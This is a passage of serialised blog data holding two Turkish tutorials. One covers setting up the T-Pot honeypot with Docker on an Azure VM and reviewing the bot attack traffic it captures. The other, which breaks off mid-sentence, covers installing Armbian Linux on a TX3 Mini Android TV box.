konular\u0131"}],"readingTime":4.935,"hasTruncateMarker":true,"authors":[{"name":"Berk Ali Er\xe7elik","title":"Cyber Security & Full Stack Web Dev","url":"https://github.com/berkercelik","page":{"permalink":"/b-log/blog/authors/berkercelik"},"socials":{"github":"https://github.com/berkercelik","linkedin":"https://www.linkedin.com/in/berkaliercelik/"},"imageURL":"https://avatars.githubusercontent.com/u/72663666?v=4","key":"berkercelik"}],"frontMatter":{"slug":"honeypot-tpot-kurulumu","title":"Honeypot Projesi - T-pot Honeypot Kurulumu - \u0130lk \u0130zlenimler - B\xf6l\xfcm 1","authors":["berkercelik"],"tags":["siberguvenlik","sysadmin"]},"unlisted":false,"prevItem":{"title":"Honeypot Projesi - Kapsaml\u0131 T-Pot Honeypot Veri Analizi ve Elasticsearch & Kibana Rehberi - B\xf6l\xfcm 2","permalink":"/b-log/blog/tpot-honeypot-analizi-elasticsearch-kibana"},"nextItem":{"title":"Android Box\'a Armbian Linux \u0130\u015fletim Sistemi Y\xfcklemek","permalink":"/b-log/blog/android-box-armbian-kurulumu"}},"content":"## Giri\u015f\\r\\n\\r\\n### Honeypot nedir?\\r\\nSiber g\xfcvenlikte sald\u0131rganlar\u0131n davran\u0131\u015flar\u0131n\u0131, y\xf6ntemlerini ve ara\xe7lar\u0131n\u0131 analiz etmek i\xe7in tasarlanm\u0131\u015f m\u0131\u015f gibi davranan \u201ctuzak sistemler\u201ddir.\\r\\n\\r\\nAma\xe7: Ger\xe7ek sistemleri korumak de\u011fil, sald\u0131rganlar\u0131 izlemek, veri toplamak ve analiz etmektir. Bu sayede ayn\u0131 sald\u0131r\u0131 ger\xe7ek siteme uygulanmak isterse \xf6nceden \xf6nlem alabiliriz.\\r\\n\\r\\n### T-Pot Honeypot nedir?\\r\\nTelekom Security taraf\u0131ndan geli\u015ftirilen, Docker tabanl\u0131 ve a\xe7\u0131k kaynakl\u0131 bir projedir. Birden fazla senaryo ve portlar i\xe7in farkl\u0131 makineleri ayn\u0131 anda \xe7al\u0131\u015ft\u0131r\u0131r. \u0130\xe7erisinde SSH, RDP, web uygulamalar\u0131, end\xfcstriyel kontrol sistemleri gibi bir\xe7ok hedef sim\xfclasyonu bulunur.\\r\\n\\r\\n| [T-Pot Github Repo](https://github.com/telekom-security/tpotce)\\r\\n\\r\\n![ ](media/image1.png)\\r\\n\\r\\n\x3c!-- truncate --\x3e\\r\\n\\r\\n### Neden bu projeyi kurdum?\\r\\n  - Ger\xe7ek d\xfcnyadan gelen sald\u0131r\u0131 verilerini toplamak.\\r\\n  - Farkl\u0131 sald\u0131r\u0131 tiplerini g\xf6zlemlemek (brute force, exploit denemeleri, botnet ba\u011flant\u0131lar\u0131 vb.) ve analiz etmek.\\r\\n  - SIEM/EDR entegrasyonu ile otomatik savunma senaryolar\u0131 olu\u015fturmak.\\r\\n\\r\\n## Gereksinimler\\r\\n\\r\\nBu projeyi aya\u011fa kald\u0131rmak i\xe7in minimum 8GB RAM ve 128GB disk alan\u0131na sahip bir sanal makine gerekli. (16GB RAM daha iyi olur.)\\r\\nBiraz maliyetli olaca\u011f\u0131ndan e\u011fer \xf6\u011frenciyseniz Github Student Developer Pack ile Digital Ocean (y\u0131ll\u0131k 200$) veya Azure (y\u0131ll\u0131k 100$) kredileri alarak \xfccretsiz deneyebilirsiniz. Bu projede Microsoft Azure \xfczerinden devam ettim.\\r\\n\\r\\n[Github Student Developer Pack](https://education.github.com/pack)\\r\\n\\r\\n## Kurulum\\r\\n\\r\\n### Docker Kurulumu\\r\\n\\r\\n![](media/image.png)\\r\\n\\r\\nSanal makine olu\u015ftururken Ubuntu 24.04.2 LTS kulland\u0131m. G\xfcvenlik ama\xe7l\u0131 SSH portunu \u015fifreli giri\u015fe kapal\u0131 olarak ba\u015flatt\u0131m ve SSH anahtar dosyas\u0131n\u0131 ilgili konuma ta\u015f\u0131d\u0131m. Daha sonra ba\u011fland\u0131m.\\r\\n\\r\\n`ssh -i C:\\\\Users\\\\Kullanici_adi\\\\.ssh\\\\id_rsa_dosyasi username@sunucu_ip`\\r\\n\\r\\nSunucuya eri\u015fim sa\u011flad\u0131ktan sonra g\xfcncellemeleri yap\u0131yoruz.\\r\\n\\r\\n```\\r\\nsudo apt update\\r\\nsudo apt install -y ca-certificates curl gnupg lsb-release\\r\\n```\\r\\n\\r\\nDaha sonra [Docker](https://www.docker.com/) ve Docker Compose y\xfcklemek i\xe7in bulundu\u011fumuz dizine `install-docker.sh` dosyas\u0131n\u0131 olu\u015fturuyoruz.\\r\\n\\r\\n`nano install-docker.sh`\\r\\n\\r\\n```\\r\\n#!/bin/bash\\r\\n\\r\\n# Docker\'\u0131n Resmi GPG Key ve Repo\'lar\u0131n\u0131 ekliyoruz.\\r\\n\\r\\nsudo mkdir -p /etc/apt/keyrings\\r\\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\\r\\necho \\\\\\r\\n  \\"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\\\\\r\\n  $(lsb_release -cs) stable\\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null\\r\\n\\r\\n# Docker Engine y\xfckleme\\r\\n\\r\\nsudo apt update\\r\\necho \\"Docker Engine y\xfckleniyor...\\"\\r\\nsudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin\\r\\n\\r\\n# Kullan\u0131c\u0131y\u0131 Docker grubuna ekleme\\r\\n\\r\\necho \\"Kullan\u0131c\u0131 Docker grubuna ekleniyor.\\"\\r\\nsudo usermod -aG docker $USER\\r\\n\\r\\n# Docker Compose y\xfckleme\\r\\n\\r\\necho \\"Docker Compose y\xfckleniyor...\\"\\r\\nDOCKER_COMPOSE_VERSION=$(curl -s https://api.github.com/repos/docker/compose/releases/latest | grep \'\\"tag_name\\":\' | sed -E \'s/.*\\"([^\\"]+)\\".*/\\\\1/\')\\r\\nsudo curl -L \\"https://github.com/docker/compose/releases/download/$DOCKER_COMPOSE_VERSION/docker-compose-$(uname -s)-$(uname -m)\\" -o /usr/local/bin/docker-compose\\r\\nsudo chmod +x /usr/local/bin/docker-compose\\r\\n\\r\\n# Docker s\xfcr\xfcm kontrol\xfc\\r\\n\\r\\ndocker --version\\r\\ndocker-compose --version\\r\\n\\r\\necho \\"Docker ve Docker Compose ba\u015far\u0131yla kuruldu.\\"\\r\\n```\\r\\n\\r\\nBu bash scripti install-docker.sh dosyas\u0131na yazd\u0131m. Dosyay\u0131 kaydettikten sonra `chmod +x install-docker.sh` ile dosyay\u0131 \xe7al\u0131\u015ft\u0131r\u0131labilir yapt\u0131k. \\r\\n\\r\\nDaha sonra `./install-docker.sh` ile scripti \xe7al\u0131\u015ft\u0131rd\u0131k.\\r\\n\\r\\n### T-Pot Kurulumu\\r\\n\\r\\nBulundu\u011fumuz `/home/username` diznine `git clone https://github.com/telekom-security/tpotce` ile T-Pot\'u indiriyoruz.\\r\\n`cd tpotce/` ile dizine giriyoruz.\\r\\n\\r\\n`./install.sh` ile kuruluma ba\u015fl\u0131yoruz. Kullan\u0131c\u0131 ad\u0131 ve \u015fifre belirliyoruz. Kurulum esnas\u0131nda bitene kadar bekledikten sonra en son SSH ile 64295 portundan ba\u011flanman\u0131z\u0131 isteyen bir mesaj ekranda belirecek.\\r\\n\\r\\n`### Done. Please reboot and re-connect via SSH on tcp/64295.`\\r\\n\\r\\nSistemi `sudo reboot now` ile yeniden ba\u015flat\u0131p ilgili porta `ssh -i C:\\\\Users\\\\Kullanici_adi\\\\.ssh\\\\id_rsa_dosyasi username@sunucu_ip -p 64295` komutu ile ba\u011fland\u0131m.\\r\\n\\r\\n### A\u011f Trafi\u011fini D\xfczenleme\\r\\n\\r\\nE\u011fer **Azure** kullan\u0131yorsan\u0131z portlar sunucunuzda a\xe7\u0131k olsa bile Azure\'a ait olan **Network Security Group (NSG)** \xfczerinde sistemin d\u0131\u015far\u0131ndan trafik alabilmesi i\xe7in de\u011fi\u015fiklik yap\u0131lmas\u0131 gerekli. `ss -tuln` ile a\xe7\u0131k portlar\u0131n\u0131z\u0131 kontrol edebilirsiniz. Kar\u015f\u0131l\u0131\u011f\u0131 0.0.0.0 olan portlar t\xfcm IP\'lere a\xe7\u0131kt\u0131r.\\r\\n\\r\\n```\\r\\nK\xfc\xe7\xfck bir \xf6rnek\\r\\n...\\r\\ntcp    LISTEN  0       4096            0.0.0.0:80             0.0.0.0:*      users:((\\"docker-proxy\\",pid=6192,fd=7))\\r\\ntcp    LISTEN  0       4096            0.0.0.0:81             0.0.0.0:*      users:((\\"docker-proxy\\",pid=5664,fd=7))\\r\\ntcp    LISTEN  0       4096            0.0.0.0:42             0.0.0.0:*      users:((\\"docker-proxy\\",pid=5635,fd=7))\\r\\ntcp    LISTEN  0       4096            0.0.0.0:22             0.0.0.0:*      users:((\\"docker-proxy\\",pid=5484,fd=7))\\r\\n...\\r\\n```\\r\\n\\r\\nNSG \xfczerinde de\u011fi\u015fiklik yapmak i\xe7in sunucunun Azure sayfas\u0131na giriyoruz. Sol men\xfcden **A\u011f ileti\u015fimi > A\u011f ayarlar\u0131** k\u0131sm\u0131na ge\xe7iyoruz. \\r\\n\\r\\n![ ](media/image-5.png)\\r\\n\\r\\nKurallar k\u0131sm\u0131nda \\"Ba\u011flant\u0131 noktas\u0131 kural\u0131 olu\u015ftur\\" ve ard\u0131ndan \\"Gelen ba\u011flant\u0131 noktas\u0131 kural\u0131\\" k\u0131sm\u0131na giriyoruz.\\r\\n\\r\\n![ ](media/image-6.png)\\r\\n\\r\\nBurada \xf6ncelikle 64295,64297 portlar\u0131na izin vermemiz gerekiyor. A\u015fa\u011f\u0131daki g\xf6rseldeki \xf6rne\u011fe uygun olarak izin veriyoruz. \u0130sterseniz kaynak olarak sadece kendi IP\'nize izin verebilirsiniz.\\r\\n\\r\\n![ ](media/image-7.png) \\r\\n\\r\\n\\r\\nDaha sonra T-Pot projesinin ihtiyac\u0131 olan t\xfcm TCP portlara izin veriyoruz.\\r\\n![ ](media/image-8.png)\\r\\n\\r\\n\u0130lgili Portlar: `20,21,22,23,25,42,80,81,104,110,135,143,443,445,465,587,593,631,993,995,1025,1080,1433,1723,1883,2404,2575,27017,3000,3306,50100,5432,5555,5900,6379,8080,8443,9100,9200,10001`\\r\\n\\r\\nve bir kural daha ekleyerek ayn\u0131 \u015fekilde UDP se\xe7erek `161,623,5000,5060` portlar\u0131na da izin veriyoruz. Olu\u015fturdu\u011fumuz kurallar\u0131n ismi herhangi bir isim olabilir. \xd6ncelik de\u011feri otomatik \u015fekilde artar.\\r\\n\\r\\n### Sunucunun Bazen \xc7\xf6kmesi\\r\\n\\r\\nSunucu \xe7ok yo\u011fun bir trafik geldi\u011finde tamamen savunmas\u0131z oldu\u011fu ve istekleri s\u0131n\u0131rlamad\u0131\u011f\u0131m\u0131z i\xe7in \xe7\xf6kebilir durumda. TPot Honeypot gibi yo\u011fun trafik alan sistemlerde, \xf6zellikle kaynak y\xf6netimi kritik \xf6neme sahiptir. Sunucuya a\u015f\u0131r\u0131 say\u0131da e\u015f zamanl\u0131 ba\u011flant\u0131 ve istek geldi\u011finde, i\u015flemci, bellek ve disk gibi kaynaklar h\u0131zla t\xfckenebilir. E\u011fer istek s\u0131n\u0131rland\u0131rmas\u0131 yap\u0131lmazsa ve a\u011f trafi\u011fi do\u011fru y\xf6netilmezse, sunucu yan\u0131t veremez hale gelip \xe7\xf6kebilir. Bu durumda sistemi yeniden ba\u015flatmam\u0131z gerekir.\\r\\n\\r\\n## T-Pot Aray\xfcz\xfc\\r\\n\\r\\nTaray\u0131c\u0131 \xfczerinden `https://sunucu_ip:64297` ile T-Pot aray\xfcz\xfcne eri\u015fiyoruz. \u0130lk y\xfckleme biraz uzun s\xfcrebilir. Belirledi\u011fimiz kullan\u0131c\u0131 ad\u0131 ve \u015fifre ile giri\u015f yap\u0131yoruz.\\r\\n\\r\\nBuradan \xe7e\u015fitli servisleri izleyebiliriz. Attack Map ile hangi IP\'den hangi protokole, porta istek at\u0131ld\u0131\u011f\u0131n\u0131 anl\u0131k olarak harita \xfczerinde g\xf6rebiliriz.\\r\\nKibana k\u0131sm\u0131 projenin merkezi denebilir. Sunucuda \xe7al\u0131\u015fan t\xfcm makinelerin istatistikleri burada tutuluyor ve grafikler halinde sunuluyor.\\r\\n\\r\\n![ ](media/image-2.png)\\r\\n\\r\\n## \u0130lk \u0130zlenimler\\r\\n\\r\\n\u0130lk \xe7al\u0131\u015ft\u0131rd\u0131\u011f\u0131m\u0131z anda bile sunucuya botlar taraf\u0131ndan ba\u011flant\u0131lar gelmeye ba\u015flar. \xd6zellikle 22 (SSH), 80 (HTTP) ve 445 (SMB) portlar\u0131 yo\u011fun hedeflenir. Cowrie (SSH/Telnet), Dionaea (malware yakalama), Tanner, H0neytr4p gibi farkl\u0131 mod\xfcller aktif. Kibana \xfczerinde sald\u0131r\u0131 kaynaklar\u0131 (\xfclke, IP), kullan\u0131lan kullan\u0131c\u0131 adlar\u0131/\u015fifreler, exploit denemeleri canl\u0131 olarak takip edilebiliyor. Suricata Alert Signature, Top IP listeleri, sald\u0131r\u0131 trend grafikleri, ilgili CVE\'ler ve bir\xe7ok b\xf6l\xfcm mevcut. \\r\\n\\r\\nBaz\u0131 IP\'lere [Talos](https://www.talosintelligence.com/reputation_center) ile bakt\u0131\u011f\u0131mda Email Reputation de\u011ferleri ve Block Lists de\u011ferleri ilgili IP\'nin spam olarak i\u015faretledi\u011fini belirtiyor. \\r\\n\\r\\n![ ](media/image-3.png)\\r\\n![ ](media/image-4.png)\\r\\n![ ](media/image-10.png)\\r\\n\\r\\n> E\u011fer bu salg\u0131rgan sunucu ilerde kapan\u0131r ve ayn\u0131 IP hosting hizmeti taraf\u0131ndan ba\u015fka bir kullan\u0131c\u0131n\u0131n sunucusuna atan\u0131rsa yeni kullan\u0131c\u0131 bu de\u011ferlerden dolay\u0131 \xe7e\u015fitli problemler ya\u015fayabilir. Bu kara listeyi ve mail itibar sorununu \xe7e\u015fitli prosed\xfcrleri takip ederek d\xfczeltebilir.\\r\\n\\r\\n## Sonu\xe7\\r\\n\\r\\nT-Pot Honeypot kurulumu ile sald\u0131r\u0131ya a\xe7\u0131k, zaafiyetli bir sunucu olu\u015fturduk. Bu sayede ger\xe7ek d\xfcnyadan gelen sald\u0131r\u0131 trafi\u011fini g\xf6zlemleyebiliyor, farkl\u0131 sald\u0131r\u0131 tekniklerini ve hedeflerini detayl\u0131 \u015fekilde analiz edebiliyoruz. Ayn\u0131 zamanda savunma mekanizmalar\u0131m\u0131z\u0131 geli\u015ftirmek i\xe7in de\u011ferli veri sa\u011fl\u0131yor. Ancak bu noktadan sonra sunucunun kaynak t\xfcketimine ve iyi yap\u0131land\u0131r\u0131lm\u0131\u015f olmas\u0131na dikkat ederek ilerlemeliyiz. \\r\\n\\r\\nSonu\xe7 olarak, T-Pot kurulan bir sunucu, siber g\xfcvenlik alan\u0131nda analiz, izleme ve savunma geli\u015ftirme konusunda g\xfczel bir deneyim sa\u011flar.\\r\\n\\r\\nBu rehber, A\u011fustos 2025 itibar\u0131yla T-Pot Honeypot\u2019un en g\xfcncel versiyonuna g\xf6re haz\u0131rlanm\u0131\u015ft\u0131r."},{"id":"android-box-armbian-kurulumu","metadata":{"permalink":"/b-log/blog/android-box-armbian-kurulumu","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2025-06-16/2025-06-16-android-box-armbian-kurulumu.md","source":"@site/blog/2025-06-16/2025-06-16-android-box-armbian-kurulumu.md","title":"Android Box\'a Armbian Linux \u0130\u015fletim Sistemi Y\xfcklemek","description":"Giri\u015f","date":"2025-06-16T00:00:00.000Z","tags":[{"inline":false,"label":"Sistem","permalink":"/b-log/blog/tags/sistem","description":"Donan\u0131m, i\u015fletim sistemleri ve temel sistem y\xf6netimi konular\u0131"},{"inline":false,"label":"Sistem Y\xf6netimi","permalink":"/b-log/blog/tags/sistemyonetimi","description":"Sistem y\xf6neticili\u011fi, sunucu yap\u0131land\u0131rma ve y\xf6netimi konular\u0131"}],"readingTime":10.085,"hasTruncateMarker":true,"authors":[{"name":"Berk Ali Er\xe7elik","title":"Cyber Security & Full Stack Web Dev","url":"https://github.com/berkercelik","page":{"permalink":"/b-log/blog/authors/berkercelik"},"socials":{"github":"https://github.com/berkercelik","linkedin":"https://www.linkedin.com/in/berkaliercelik/"},"imageURL":"https://avatars.githubusercontent.com/u/72663666?v=4","key":"berkercelik"}],"frontMatter":{"slug":"android-box-armbian-kurulumu","title":"Android Box\'a Armbian Linux \u0130\u015fletim Sistemi Y\xfcklemek","authors":["berkercelik"],"tags":["sistem","sysadmin"]},"unlisted":false,"prevItem":{"title":"Honeypot Projesi - T-pot Honeypot Kurulumu - \u0130lk \u0130zlenimler - B\xf6l\xfcm 1","permalink":"/b-log/blog/honeypot-tpot-kurulumu"},"nextItem":{"title":"Testsparker ASP.NET S\u0131zma Testi & Zaafiyet Analizi Raporu","permalink":"/b-log/blog/testsparker-sizma-testi-aspnet"}},"content":"## Giri\u015f\\r\\n\\r\\nHerkese selamlar. Bu rehberde Amlogic S905W i\u015flemcili s\u0131radan bir Android Box\'\u0131 nas\u0131l Raspberry Pi veya Orange Pi\'a \xe7evirece\u011fiz bunu anlataca\u011f\u0131m. Bu fikir hem b\xfct\xe7e ve verimlilik hem de hobi ama\xe7l\u0131 olarak \xe7\u0131kt\u0131 ve o \u015fekilde ilerledi. Yaz\u0131n\u0131n sonunda neler kurulabilece\u011fini ve \xe7al\u0131\u015ft\u0131r\u0131labilece\u011fini yazaca\u011f\u0131m. Neden g\xfcn\xfcm\xfczde bir ihtiya\xe7 oldu\u011fu ki\u015fiden ki\u015fiye de\u011fi\u015febilir, hakk\u0131nda daha detayl\u0131 bir yaz\u0131 gerekli. Veya deneyim kazanmak i\xe7in uygulayabilirsiniz.\\r\\n\\r\\n## Android Box\'lar\u0131n \u0130\u015flemcilerinin Uyumlulu\u011fu Hakk\u0131nda\\r\\n\\r\\nPiyasada s\u0131f\u0131r veya ikinci el olarak sat\u0131lan \xe7ok fazla marka, model Android Box var. Allwinner H616, H618 veya H313 serisi i\u015flemciler, Rockchip RK3588, RK3568, RK3528, RK3328 i\u015flemciler, Amlogic S9xxx, S905, S904, S903, S912 gibi \xe7ok fazla i\u015flemci mevcut. G\xfcncel Orange Pi Zero 3 cihaz\u0131n\u0131 \xf6rnek al\u0131rsak bu tarz yeni nesil cihazlarda H618 4 \xe7ekirdekli i\u015flemciler kullan\u0131l\u0131yor. Birka\xe7 benchmark sitesini referans ald\u0131\u011f\u0131mda \x3c!-- truncate --\x3e performans olarak aralar\u0131nda pek fark yok olarak g\xf6z\xfck\xfcyor. Zaten TDP de\u011ferleri do\u011frudan a\xe7\u0131klanmasa da totalde en y\xfcksek 10-15W kullanabilen cihazlar. Armbian web sitesinde topluluk olabildi\u011fince her chipset i\xe7in destek vermeye, o chipsete \xf6zel kernel build etmeye \xe7al\u0131\u015f\u0131yor. \\r\\n\\r\\n**E\u011fer bu projeyi yapacaksan\u0131z \xf6nce alaca\u011f\u0131n\u0131z cihaz\u0131n i\u015flemcisinin deste\u011finin olup olmad\u0131\u011f\u0131n\u0131 ara\u015ft\u0131rman\u0131z gerekli. Alternatif olarak [CoreELEC](https://coreelec.org/) i\u015fletim sistemini de ara\u015ft\u0131rabilirsiniz.**\\r\\n\\r\\n## TX3 Mini Android Box ve Reset Butonu\\r\\n\\r\\nAz \xf6nce belirtti\u011fim \u015fekilde ikinci el olarak ara\u015ft\u0131rd\u0131\u011f\u0131mda bu cihaza denk geldim. Hem forumlarda ismi \xe7ok ge\xe7iyordu hem de i\u015flemcisi uyumlu g\xf6z\xfck\xfcyordu. \u0130kinci el olarak sat\u0131n ald\u0131m. \\r\\n\\r\\nTX3 Mini Donan\u0131m\u0131: 2GB RAM, S905W 4 \xc7ekirdek i\u015flemci, 1x Ethernet Portu (RJ45), G\xfc\xe7 giri\u015fi (5W 2A Adapt\xf6r), AV, HDMI Portu, SD Kart giri\u015fi, birka\xe7 i\u015fime yaramayan giri\u015f daha, USB portlar\u0131 ve yan\u0131nda gelen kumanda. \\r\\n\\r\\n![](media/tx3mini.png)\\r\\n\\r\\n**Di\u011fer cihazlar\u0131n aksine AV Portu i\xe7erisine gizlenmi\u015f bir reset tu\u015fu veya herhangi bir reset tu\u015fu bulunmuyor. Cihaz\u0131 al\u0131rken bunu da g\xf6z ard\u0131 etmeyin. Veya uygulad\u0131\u011f\u0131m y\xf6ntemle kullanabilirsiniz. Cihaz\u0131 reset sonras\u0131 boot edece\u011fimiz i\xe7in \xf6nemli.**\\r\\n\\r\\n## Uygun Linux Da\u011f\u0131t\u0131m\u0131n\u0131 ve Kerneli Bulma\\r\\n\\r\\n\xd6ncelikle bu noktada Google\'da arayarak veya [Armbian Download](https://www.armbian.com/download/) sayfas\u0131ndan ilerleyebilirsiniz. Ben bu cihaz i\xe7in \\r\\n\\r\\n\\"https://www.armbian.com/amlogic-s9xx-tv-box/\\" sayfas\u0131nda bulunan \\"Server images with Armbian Linux v6.12\\" k\u0131sm\u0131ndaki \\"Ubuntu 24.04 (Noble)\\" s\xfcr\xfcm\xfcn\xfc kulland\u0131m.\\r\\n(Armbian_community_25.8.0-trunk.90_Aml-s9xx-box_noble_current_6.12.31.img)\\r\\n\\r\\nAlternatif olarak ara\u015ft\u0131rabilece\u011finiz di\u011fer repolar:\\r\\n\\"https://github.com/ophub/amlogic-s9xxx-armbian\\"\\r\\n(Bir\xe7ok i\u015flemciye destek mevcut) (Bu repo\'dan da uygun ISO\'yu (Armbian_25.08.0_amlogic_s905w_jammy_6.12.31_server_2025.06.01.img) denedi\u011fimde \xe7al\u0131\u015fmam\u0131\u015ft\u0131 ama y\xf6ntemim yanl\u0131\u015ft\u0131. Tekrar denersem \xe7al\u0131\u015fabilir.)\\r\\n\\r\\n- https://github.com/NickAlilovic/build\\r\\n- https://github.com/LYU4662/h618-build\\r\\n- https://github.com/ophub/kernel\\r\\n- https://github.com/sicXnull/armbian-build/tree/X96Q-TVBOX-LPDDR3\\r\\n\\r\\n- https://github.com/ophub/amlogic-s9xxx-armbian/blob/11dbe090ca7b53d3415ecabf48b1e276b2438c66/build-armbian/armbian-files/common-files/etc/model_database.conf#L93C4-L93C4\\r\\n(Her model i\xe7in database)\\r\\n\\r\\n## SD Kart\'a \u0130maj\u0131 Yazmak\\r\\n\\r\\n### SD Kart Boyutu & Kalitesi\\r\\nMinimum 8 GB olmak \u015fart\u0131yla kullanaca\u011f\u0131n\u0131z kart\u0131n boyutu tamamen opsiyonel, Class 10 ve \xfczeri kalitede olmas\u0131 \xf6nemli. \\"Kioxia Exceria 64GB microSDXC Kart (100MB/s okuma)\\" kulland\u0131m ve performans olarak bir eksiklik hissetmedim. \\r\\n\\r\\nBu ad\u0131mda balenaEtcher adl\u0131 yaz\u0131l\u0131m\u0131 kullanaca\u011f\u0131z. Rufus da kullanabilirsiniz. Kart\u0131n\u0131z\u0131n yazma korumas\u0131n\u0131n kapal\u0131 oldu\u011funa emin olun.\\r\\n\\"https://etcher.balena.io/\\" adresinden indirebilirsiniz. Her i\u015fletim sistemini destekliyor. Teorik olarak USB ile de ayn\u0131 i\u015flemi yapabilirsiniz fakat her cihaz USB\'yi boot edilebilir \u015fekilde alg\u0131lam\u0131yor ve USB giri\u015fi uzun s\xfcre \xfczerinde okuma yazma yap\u0131l\u0131rsa \u0131s\u0131nmaya sebep olabiliyor. Bu y\xfczden SD Kart \xfczerinden sistemi aya\u011fa kald\u0131rman\u0131z\u0131 tavsiye ederim. Bu yaz\u0131l\u0131m \xe7ok basit bir aray\xfcze sahip. \xd6nce yazd\u0131rmak istedi\u011fimiz imaj\u0131 se\xe7ip ard\u0131ndan ilgili diski se\xe7iyoruz. E\u011fer imaj\u0131 \\".xz .gz\\" gibi bir halde indirdiyseniz ve hata al\u0131yorsan\u0131z 7-Zip ile imaj\u0131 dosyaya \xe7\u0131kar\u0131p tekrar deneyebilirsiniz. Y\xfcklendikten sonra Verify k\u0131sm\u0131n\u0131 bekleminizi tavsiye ederim. \u0130\u015fletim sistemlerinde dosya b\xfct\xfcnl\xfc\u011f\xfc kurulum a\u015famas\u0131nda hata \xe7\u0131kmamas\u0131 i\xe7in \xf6nemlidir.\\r\\n\\r\\n![](media/image.png)\\r\\n\\r\\nKurulum tamamland\u0131ktan sonra Windows \\"bi\xe7imlendirmeniz gerekiyor\\" uyar\u0131s\u0131 verebilir, \xf6nemli de\u011fil. Kart\u0131 \xe7\u0131kar\u0131p tekrar tak\u0131n. \\r\\n\\r\\n1. Ard\u0131ndan S905W i\u015flemci kulland\u0131\u011f\u0131m i\xe7in \\"u-boot-s905x-s912\\" dosyas\u0131n\u0131 u-boot.ext olarak adland\u0131rd\u0131m. Burada kendi i\u015flemciniz i\xe7in bir\xe7ok farkl\u0131 y\xf6ntem olabilir. \\r\\n\\r\\n2. Daha sonra /extlinux/extlinux.conf dosyas\u0131n\u0131 not defteri ile d\xfczenliyoruz. \\r\\nfdt /dtb/amlogic/meson-gxl-s905w-p281.dtb sat\u0131r\u0131n\u0131 ekliyoruz ve e\u011fer varsa di\u011fer FDT sat\u0131rlar\u0131n\u0131 yorum sat\u0131r\u0131 yap\u0131yoruz ve kaydediyoruz. Yine cihaz\u0131n\u0131za g\xf6re bu k\u0131s\u0131m de\u011fi\u015fiklik g\xf6sterecektir.\\r\\n\\r\\n```\\r\\nlabel Armbian_community\\r\\n   kernel /Image\\r\\n   initrd /uInitrd\\r\\n   fdt /dtb/amlogic/meson-gxl-s905w-p281.dtb\\r\\n   append root=UUID=xxx rootflags=data=writeback console=ttyAML0, 115200n8 console=tty0 rw \\r\\nno_console_suspend consoleblank=0 fsck.fix=yes fsck.repair=yes net.ifnames=0 splash plymouth.ignore-serial-consoles\\r\\n```\\r\\n\\r\\n\xd6rnek `extlinux.conf` bu \u015fekilde, UUID k\u0131sm\u0131nda da ba\u015fka bir de\u011fer olmal\u0131.\\r\\n\\r\\n**Cihazda 2GB RAM olmas\u0131na ra\u011fmen 1GB olarak \xe7al\u0131\u015f\u0131yor. Bunun sebebi bu a\u015famada eksik yap\u0131land\u0131rma yapm\u0131\u015f olmam veya yanl\u0131\u015f DTB dosyas\u0131 ile \xe7al\u0131\u015ft\u0131rmam olabilir. \u015eimdilik 1 GB olarak kullanmaya devam ediyorum daha sonra bu sorunu \xe7\xf6zece\u011fim.**\\r\\n\\r\\n## \u0130lk \xc7al\u0131\u015ft\u0131rma\\r\\n\\r\\nSD Kart\u0131 Android Box\'a yerle\u015ftirdikten sonra,\\r\\n\\r\\n### Reset butonunuz varsa\\r\\n\\r\\n\u0130\u015finiz \xe7ok basit. \xc7o\u011fu cihazda SD kart\u0131n\u0131 yerle\u015ftirdikten sonra reset ve power butonuna bas\u0131l\u0131 tutarak cihaz\u0131n SD karttan a\xe7\u0131lmas\u0131 tetikleniyor ve bu sayede cihaz SD kart \xfczerinden boot oluyor.\\r\\n\\r\\n### Reset butonunuz yoksa\\r\\n\\r\\n\xd6nce birka\xe7 farkl\u0131 y\xf6ntem denesem de maalesef \xe7al\u0131\u015fmad\u0131. Bu y\xf6ntemlerden biri Android uygulamalar\u0131 aras\u0131nda bulunan \\"Run Update & Backup\\" uygulamas\u0131 ile \\"Select\\" k\u0131sm\u0131ndan SD Kart\u0131 se\xe7erek \\"aml_autoscript.zip\\" dosyas\u0131n\u0131 \xe7al\u0131\u015ft\u0131rmak. Zip\'ten \xe7\u0131kararak da deneyebilirsiniz. Bu y\xf6ntem \xe7al\u0131\u015fmad\u0131. Daha sonra cihaz\u0131 normal \u015fekilde Android olarak ba\u015flatt\u0131m. Android 11 y\xfckl\xfc \u015fekilde gayet stabil \xe7al\u0131\u015f\u0131yor. \\r\\nJack Palevich\'e ait olan en pop\xfcler Terminal Emulator\'\xfc \\"https://www.apkmirror.com/apk/jack-palevich/terminal-emulator/\\" adresinden indirdim ve USB\'ye kopyalad\u0131m. Android uygulamalar aras\u0131nda \\"AppInstall\\" isimli uygulamay\u0131 a\xe7t\u0131m. Yoksa dosya y\xf6neticisinden de ayn\u0131 \u015fekilde y\xfckleyebilirsiniz. Buradan APK dosyas\u0131n\u0131 y\xfckledim. Terminal Emulatoru a\xe7t\u0131m ve konsolda kullan\u0131c\u0131 ad\u0131n olarak \\"p281\\" yaz\u0131yordu. Bu asl\u0131nda cihaz\u0131n hangi chipsete sahip oldu\u011funu da a\xe7\u0131kl\u0131yor. \\r\\n\\r\\nKonsola `reboot update` yazd\u0131m ve enter\'a bast\u0131m.\\r\\n\\r\\nCihaz SD kart \xfczerinden yeniden ba\u015flad\u0131. E\u011fer dosyalar\u0131 do\u011fru yap\u0131land\u0131rd\u0131ysan\u0131z do\u011frudan Armbian Linux komut sat\u0131r\u0131 ekrana gelmeli.\\r\\n\\r\\n![](media/image-1.png)\\r\\n![](media/image-2.png)\\r\\n\\r\\n\u0130lk \xe7al\u0131\u015ft\u0131rmada kullan\u0131c\u0131 ad\u0131, \u015fifre, kablosuz internet kullan\u0131m\u0131, dil ve klavye dizilimi belirleme gibi sorular soruyor. Bu ad\u0131mda T\xfcrk\xe7e (tr_TR.UTF-8) i\xe7in 305 yaz\u0131p devam edebilirsiniz. Kablosuz sorusuna \\"n\\" diyerek hay\u0131r cevab\u0131 verdim \xe7\xfcnk\xfc cihaz\u0131 kablo ile modeme ba\u011flayarak kullanaca\u011f\u0131m. Kurulum ad\u0131mlar\u0131 tamamland\u0131\u011f\u0131nda yeniden ba\u015flayabilir. Daha sonra 